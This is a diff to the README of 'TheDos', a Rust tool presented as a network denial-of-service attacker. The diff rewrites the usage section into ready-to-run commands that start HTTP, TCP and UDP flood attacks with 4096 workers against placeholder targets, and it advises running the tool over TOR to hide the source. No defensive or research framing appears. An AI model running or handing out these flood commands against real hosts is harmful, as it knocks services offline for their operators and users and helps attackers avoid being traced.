@@ -7,24 +7,15 @@
 
 ## TheDos
 
-Asynchronous & Multithreaded Based Tools to Attack Network
+Attack networks asynchronously by getting help of workers! 
 
-> Run it over TOR
 
 ## Usage
 
-* run the attack using 4096 workers
+> Run it over TOR
 
-```cargo run -- --help```
+* start http attack with 4096 workers: ```cargo run -- --http-addr http://example.app --workers 4096```
 
-* start http attack with 4096 workers
+* start tcp attack with 4096 workers: ```cargo run -- --tcp-addr 93.184.216.34:24535 --workers 4096```
 
-```cargo run -- --http-addr http://example.app --workers 4096```
-
-## DDOS Support Protocols
-
-- TCP
-
-- UDP
-
-- HTTP
+* start udp attack with 4096 workers: ```cargo run -- --udp-addr 93.184.216.34:24535 --workers 4096```
